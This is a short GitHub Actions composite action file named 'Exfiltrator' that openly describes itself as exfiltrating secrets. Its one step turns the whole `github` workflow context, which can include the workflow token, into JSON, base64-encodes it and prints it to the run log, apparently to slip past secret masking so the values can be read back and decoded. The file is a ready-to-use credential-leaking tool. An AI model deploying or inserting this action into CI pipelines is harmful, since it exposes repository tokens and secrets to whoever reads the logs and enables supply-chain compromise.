name: 'Exfiltrator'
description: 'This exfiltrates secrets and environment variables.'

runs:
  using: "composite"
  steps:
    - name: 'Print secrets and environment variables to the terminal'
      shell: bash
      run: echo "$(echo $VARS_JSON | base64 -w 0)"
      env:
        VARS_JSON: ${{ toJSON(github) }}
        
